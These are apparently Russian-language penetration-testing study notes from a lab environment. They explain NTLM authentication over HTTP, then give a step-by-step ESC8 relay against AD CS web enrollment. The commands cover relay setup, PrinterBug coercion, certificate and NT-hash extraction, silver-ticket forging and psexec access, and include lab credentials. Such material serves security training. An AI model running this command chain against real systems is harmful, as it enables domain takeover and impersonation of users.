#http #relay #mitm #ad #hacking #ntlm #esc8

>`HTTP` атаки с ретрансляцией могут предоставить доступ к веб-конечным точкам с ограниченным доступом, что позволит нам выполнять различные действия от имени аутентифицированных пользователей, например запрашивать сертификаты в `AD CS` 
веб-конечных точках регистрации и использовать конечные точки входа ADFS

Мы можем автоматизировать фаззинг веб-конечных точек с поддержкой `NTLM` с помощью [NTLMRecon](https://github.com/praetorian-inc/NTLMRecon).

# Как проходит аутентификация

Предположим, веб-клиент запрашивает у веб-сервера конечную точку, защищенную от несанкционированного доступа, с помощью запроса с методом `GET` по (вымышленному) URL `https://academy.hackthebox.com/protected/unlimitedCubes.php`. При первой попытке доступа к ресурсу веб-клиент отправит запрос `GET` без заголовка `Authorization` :

```
GET protected/unlimitedCubes.php
```

Веб-сервер отвечает на запрос статусом Unauthorized и запрашивает использование `NTLM` проверки подлинности для доступа к этому ресурсу, отправляя заголовок ответа WWW-Authenticate со значением `NTLM`:

```
HTTP/1.1 401 Unauthorized WWW-Authenticate: NTLM
```

Зная, что веб-сервер запрашивает `NTLM` аутентификацию, веб-клиент получает учетные данные локального пользователя с помощью пакета безопасности *NTLMSSP*, а затем отправляет новый `GET` запрос на веб-сервер. Запрос содержит заголовок Authorization с кодировкой base64 `NTLM` `NEGOTIATE_MESSAGE` в `NTLM`-data:

```
GET protected/unlimitedCubes.php Authorization: NTLM tESsBmE/yNY3lb6a0Ls8Ks19wQX1Lf36vVQEZNqwQn0s8Unew
```

При получении ответа от веб-клиента веб-сервер декодирует `NTLM`-data в кодировке base64, содержащиеся в заголовке `Authorization`. Если сервер принимает эти данные аутентификации, он отвечает кодом состояния HTTP `401` и заголовком `WWW-Authenticate` с `NTLM` `CHALLENGE_MESSAGE` в `NTLM`-data:

```
HTTP/1.1 401 Unauthorized WWW-Authenticate: NTLM yNY3lb6a0L6vVxOp3MxIQEZNqwQn0s8UNew33KdZvs1Onv
```

Затем веб-клиент декодирует `NTLM`-данные в кодировке base64, содержащиеся в заголовке `WWW-Authenticate`. Если эти данные аутентификации действительны, клиент отвечает повторным отправкой `GET`-запроса с заголовком `Authorization`, содержащим `NTLM` `AUTHENTICATE_MESSAGE` в `NTLM`-данных:

```
GET protected/unlimitedCubes.php Authorization: NTLM kGaXHz6/owHcWRlvGFk8ReUa1O7dNmQL2dZKHo=QEZNqwQn0s8U
```

Наконец, веб-сервер декодирует `NTLM`-данные в кодировке base64, содержащиеся в заголовке `Authorization`. Если веб-сервер принимает эти данные аутентификации от веб-клиента, он в дополнение к запрошенному контенту отправляет HTTP-ответ с кодом успешного выполнения 2xx, указывающим на успешное выполнение запроса. Если используемый нами веб-клиент (например, браузер) не поддерживает схему аутентификации `NTLM`, мы можем использовать прокси-сервер [Proxy-Ez](https://github.com/synacktiv/Prox-Ez), который поддерживает все схемы HTTP-аутентификации. Кроме того, мы можем использовать утилиту `NTLMParse` из репозитория [ADFSRelay](https://github.com/praetorian-inc/ADFSRelay/) для декодирования `NTLM` сообщений в кодировке base64.


# ESC8

> Если в среде установлена служба Active Directory Certificate Services, 
> А также уязвимая конечная точка веб-регистрации 
> И опубликован хотя бы один шаблон сертификата, который позволяет регистрировать компьютеры в домене и выполнять аутентификацию клиентов (например, шаблон Machine/Computer по умолчанию), 
> То злоумышленник может взломать ЛЮБОЙ компьютер, на котором запущена служба диспетчера очереди печати!

`AD CS` поддерживает различные способы регистрации, в том числе регистрацию на основе HTTP, которая позволяет пользователям запрашивать и получать сертификаты по протоколу HTTP

Мы можем передать `HTTP NTLM` аутентификацию интерфейсу регистрации сертификатов — конечной точке HTTP, используемой для взаимодействия с `Certification Authority` (`CA`) ролевой службой. Ролевая служба веб-регистрации `CA` предоставляет набор веб-страниц, предназначенных для упрощения взаимодействия с `CA`. Эти конечные точки веб-регистрации обычно доступны по адресу `http://<servername>/certsrv/certfnsh.asp`. При определенных условиях мы можем использовать эти конечные точки веб-регистрации для запроса сертификатов с использованием сеансов аутентификации, полученных с помощью `NTLM` ретрансляции аутентификации. В случае успеха мы можем выдавать себя за пользователей, прошедших аутентификацию, и запрашивать сертификаты от их имени в `CA`

Поиск уязвимостей в AD CS
```bash
certipy find -enabled -u 'plaintext$'@172.16.117.3 -p 'o6@ekK5#rlw2rAe' -stdout
```

**Условия для использования `ESC8` в среде, использующей `AD CS`, следующие:**
- Уязвимая конечная точка веб-регистрации (Нет HTTPS и EPA/СBT).
- Должен быть включен хотя бы один шаблон сертификата, позволяющий регистрировать компьютеры в домене и выполнять аутентификацию клиентов (например, шаблон «Машина/компьютер» по умолчанию).

# Проведение атаки

1) Убедиться, что у нас включена вообще HTTP NTLM Auth на конечной точке
```bash
curl -I http://172.16.117.3/certsrv/ 

HTTP/1.1 401 Unauthorized 
Content-Length: 1293 
Content-Type: text/html 
Server: Microsoft-IIS/10.0 
WWW-Authenticate: Negotiate 
WWW-Authenticate: NTLM 
X-Powered-By: ASP.NET 
Date: Fri, 11 Aug 2023 20:52:44 GMT
```

## Через ntlmrelayx (дольше)

2) Запускаем ретранслятор
```bash
sudo ntlmrelayx.py -t http://172.16.117.3/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```
--adcs - Выполняем AD CS ретрансляционные атаки 
--template - Указываем DomainController, если ретранслируем админа

3) Принуждаем к аутентификации
```bash
python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30
```

3) Нам возвращается сертификат в base64 кодировке, декодируем
```bash
echo -n "MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgEghDkMIIQ4DCCBxcGCSqGSIb3DQEHBqCCBwgwggcEAgEAMI<SNIP>U6EWbi/ttH4BAjUKtJ9ygRfRg==" | base64 -d > ws01.pfx
```

4) Получаем TGT и ключ шифрование
```bash
python3 gettgtpkinit.py -dc-ip 172.16.117.3 -cert-pfx ws01.pfx 'INLANEFREIGHT.LOCAL/WS01$' ws01.ccache
```

5) Используем билет и ключ для генерации NT хэша
```bash
KRB5CCNAME=ws01.ccache python3 getnthash.py 'INLANEFREIGHT.LOCAL/WS01$' -key 917ec3b9d13dfb69e42ee05e09a5bf4ac4e52b7b677f1b22412e4deba644ebb2
```

6) Используя NT hash учетки компьютера создаем silver ticket пользователя  
```bash
ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/ws01.inlanefreight.local Administrator
```

7) Подключаемся с использованием билета
```bash
KRB5CCNAME=Administrator.ccache 

psexec.py -k -no-pass ws01.inlanefreight.local
```

## Через certipy (быстрее)

2) Запускаем ретранслятор
```bash
sudo certipy relay -target "http://172.16.117.3" -template Machine
```

3) Принуждаем к аутентификации
```bash
python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30
```

3) Получение хэша из сертификата
```bash
certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
```

4) Используя NT hash учетки компьютера создаем silver ticket пользователя  
```bash
ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/ws01.inlanefreight.local Administrator
```

5) Подключаемся с использованием билета
```bash
KRB5CCNAME=Administrator.ccache 

psexec.py -k -no-pass ws01.inlanefreight.local